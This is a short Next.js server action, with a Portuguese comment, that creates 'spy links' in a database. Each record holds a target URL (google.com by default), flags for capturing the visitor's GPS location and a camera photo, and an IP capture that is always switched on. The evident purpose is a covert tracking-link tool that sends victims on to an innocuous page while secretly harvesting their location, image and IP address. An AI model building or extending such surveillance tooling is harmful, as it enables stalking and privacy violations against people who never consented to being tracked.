'use server';

import { db } from '@/lib/db';
import { spylinks } from '@/db/schema';
import { revalidatePath } from 'next/cache';
import crypto from 'crypto';

export async function createSpyLink(formData: FormData) {
  const targetUrl = formData.get('targetUrl') as string;
  const captureGps = formData.get('captureGps') === 'on';
  const capturePhoto = formData.get('capturePhoto') === 'on';
  
  // Gera um ID curto aleatório para a URL (ex: a9f8b2)
  const id = crypto.randomBytes(3).toString('hex');

  await db.insert(spylinks).values({
    id,
    targetUrl: targetUrl || 'https://www.google.com',
    captureGps,
    capturePhoto,
    captureIp: true,
  });

  revalidatePath('/dashboard');
}